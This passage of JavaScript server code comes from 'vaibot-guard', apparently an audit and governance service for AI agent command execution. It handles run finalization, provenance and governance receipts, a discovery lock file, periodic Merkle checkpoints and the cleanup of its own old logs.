          effectiveMode: ctx1?.effectiveMode,
          hostBypass: ctx1?.hostBypass,
        }).catch((e) => console.error(`[vaibot-guard] governance receipt post failed (tool): ${e?.message || e}`));
      }

      deleteRunContext(runId);

      return json(res, 200, { ok: true, audit, prove, receiptTier, receiptEmitted });
    }

    if (req.method === "POST" && req.url === "/v1/finalize") {
      if (!requireAuth(req, res)) return;
      const raw = await readBody(req);
      let input;
      try {
        input = JSON.parse(raw || "{}");
      } catch {
        return json(res, 400, { ok: false, error: "Invalid JSON" });
      }

      const sessionId = String(input.sessionId || "unknown-session");
      const runId = String(input.runId || "");
      const result = input.result;

      // If caller didn't send sessionId, try to infer from run context.
      if ((sessionId === "unknown-session" || !sessionId) && runId) {
        const ctx0 = readRunContext(runId);
        if (ctx0?.sessionId) {
          // eslint-disable-next-line no-param-reassign
          input.sessionId = ctx0.sessionId;
        }
      }

      if (!runId) return json(res, 400, { ok: false, error: "Missing runId" });

      const ctx1 = readRunContext(runId);
      const effectiveSessionId = String(ctx1?.sessionId || sessionId || "unknown-session");

      const eventId = randomUUID();
      const audit = appendAudit({
        ts: nowIso(),
        eventId,
        kind: "exec.finalize",
        sessionId: effectiveSessionId,
        runId,
        result,
      });

      let prove = null;
      let proveError = null;
      try {
        const ctx = readRunContext(runId);
        const receipt = {
          schema: "vaibot-guard/receipt@0.1",
          kind: "exec",
          ts: nowIso(),
          runId,
          sessionId,
          policyVersion: POLICY.version,
          risk: ctx?.risk ?? null,
          intent: ctx?.intent ?? null,
          decision: ctx?.decision ?? null,
          result,
          audit,
          precheckAudit: ctx?.precheckAudit ?? null,
        };
        prove = await postVaibotProve({ receipt, idempotencyKey: runId + ":finalize" });
      } catch (e) {
        proveError = e?.message || String(e);
        prove = { ok: false, error: proveError };
      }

      if (VAIBOT_PROVE_MODE === "required") {
        if (!PROVENANCE_BASE || !VAIBOT_API_KEY) {
          return json(res, 500, { ok: false, error: "VAIBOT_PROVE_MODE=required but no provenance API key configured", audit, prove });
        }
        if (proveError || (prove && prove.ok === false)) {
          return json(res, 500, { ok: false, error: `VAIBOT_PROVE_MODE=required but /api/prove finalize failed: ${proveError || prove?.error || "unknown"}`, audit, prove });
        }
      }

      // M: tier-2 governance receipt is earned (see /v1/finalize/tool). Missing
      // tier => emit (fail-safe).
      const receiptTier = ctx1?.receiptTier ?? "receipt";
      const receiptEmitted = receiptTier === "receipt";
      if (receiptEmitted) {
        postGovernanceReceipt({
          runId,
          sessionId: effectiveSessionId,
          intent: ctx1?.intent,
          decision: ctx1?.decision,
          risk: ctx1?.risk,
          result,
          policyVersion: ctx1?.policyVersion,
          effectiveMode: ctx1?.effectiveMode,
          hostBypass: ctx1?.hostBypass,
        }).catch((e) => console.error(`[vaibot-guard] governance receipt post failed (exec): ${e?.message || e}`));
      }

      // Best-effort cleanup of run context.
      deleteRunContext(runId);

      return json(res, 200, { ok: true, audit, prove, receiptTier, receiptEmitted });
    }

    json(res, 404, { ok: false, error: "Not found" });
  } catch (err) {
    json(res, 500, { ok: false, error: err?.message || String(err) });
  }
});

if (VAIBOT_PROVE_MODE === "required" && (!PROVENANCE_BASE || !VAIBOT_API_KEY)) {
  // eslint-disable-next-line no-console
  console.error("[vaibot-guard] refusing to start: VAIBOT_PROVE_MODE=required but no provenance API key configured");
  process.exit(2);
}

server.on("error", (err) => {
  if (err && err.code === "EADDRINUSE") {
    // eslint-disable-next-line no-console
    console.error(`[vaibot-guard] failed to bind http://${HOST}:${PORT} (EADDRINUSE). Another process is using this port.`);
    // eslint-disable-next-line no-console
    console.error(`[vaibot-guard] Fix: stop the other process, or set VAIBOT_GUARD_PORT to a free port (e.g. VAIBOT_GUARD_PORT=39112).`);
    process.exit(1);
  }
  // eslint-disable-next-line no-console
  console.error(`[vaibot-guard] server error: ${err?.message || err}`);
  process.exit(1);
});

server.listen(PORT, HOST, () => {
  // eslint-disable-next-line no-console
  console.log(`[vaibot-guard] listening on http://${HOST}:${PORT}`);
  // Register in the shared rendezvous lock (~/.vaibot/guard/guard.json) so EVERY
  // way of starting the guard — a systemd unit, a plugin launcher, or a manual
  // run — is discoverable by all plugins + the CLI. This is what stops a later
  // plugin from spawning a DUPLICATE guard next to one it didn't start itself.
  try {
    writeLock({
      version: GUARD_VERSION,
      host: HOST,
      port: PORT,
      token: VAIBOT_GUARD_TOKEN,
      pid: process.pid,
      instanceId: INSTANCE_ID,
      startedAt: Date.now(),
      effective_mode: EFFECTIVE_MODE,
      // Publish the guard's resolved env so the CLI's production-coherence gate +
      // `doctor` can read it from ONE place (the de-pinned env file no longer carries
      // a VAIBOT_POLICY_URL to infer it from).
      env: CREDS_ENV,
    });
  } catch (e) {
    // eslint-disable-next-line no-console
    console.error(`[vaibot-guard] could not write discovery lock: ${e?.message || e}`);
  }
});

// Release the rendezvous lock on shutdown, but only if it still points at us
// (never clobber a newer guard that replaced us). Stale locks are harmless —
// ensureGuard health-probes before reuse — so this is best-effort.
function releaseRendezvousIfOurs() {
  try {
    const lock = readLock();
    if (lock && lock.pid === process.pid) fs.rmSync(LOCK_FILE, { force: true });
  } catch {
    /* best-effort */
  }
}
for (const sig of ["SIGTERM", "SIGINT"]) {
  process.on(sig, () => {
    releaseRendezvousIfOurs();
    try { server.close(); } catch { /* ignore */ }
    process.exit(0);
  });
}
process.on("exit", releaseRendezvousIfOurs);

// Time-based checkpointing (every 10 minutes by default): create a checkpoint if any new events
// have arrived since the last checkpoint and time has elapsed.
setInterval(() => {
  for (const sessionId of SEEN_SESSIONS) {
    try {
      const st = loadMerkleState(sessionId);
      const hasNew = st.count > (st.lastCheckpointEventCount || 0);
      if (!hasNew) continue;

      const dueByTime = !st.lastCheckpointAtMs || (Date.now() - st.lastCheckpointAtMs) >= MERKLE_CHECKPOINT_EVERY_MS;
      if (dueByTime) {
        createCheckpointIfNeeded(sessionId, "time");
        tryFlushCheckpoints(sessionId).catch(() => {});
      }
    } catch {
      // ignore periodic errors
    }
  }
}, Math.min(60_000, MERKLE_CHECKPOINT_EVERY_MS));

function cleanupOldLogs() {
  const cutoffMs = Date.now() - VAIBOT_LOG_RETENTION_DAYS * 24 * 60 * 60 * 1000;
  let removed = 0;

  function sweepDir(dir) {
    for (const ent of fs.readdirSync(dir, { withFileTypes: true })) {
      const name = ent.name;
      const p = path.join(dir, name);

      if (ent.isDirectory()) {
        // only recurse into known subdirs we manage
        if (name === "runctx") sweepDir(p);
        continue;
      }
      if (!ent.isFile()) continue;

      // only touch our own files
      if (!name.endsWith(".jsonl") && !name.endsWith(".json") && !name.endsWith(".prevhash")) continue;

      const st = fs.statSync(p);
      if (st.mtimeMs < cutoffMs) {
        fs.rmSync(p);
        removed++;
      }
    }
  }

  try {
    sweepDir(LOG_DIR);
  } catch {
    // ignore cleanup errors
  }

  if (removed > 0) {
    // eslint-disable-next-line no-console
    console.log(`[vaibot-guard] log cleanup: removed ${removed} file(s) older than ${VAIBOT_LOG_RETENTION_DAYS}d`);
  }
}

// Run cleanup hourly (cheap) and at startup.
cleanupOldLogs();
setInterval(cleanupOldLogs, 60 * 60 * 1000);
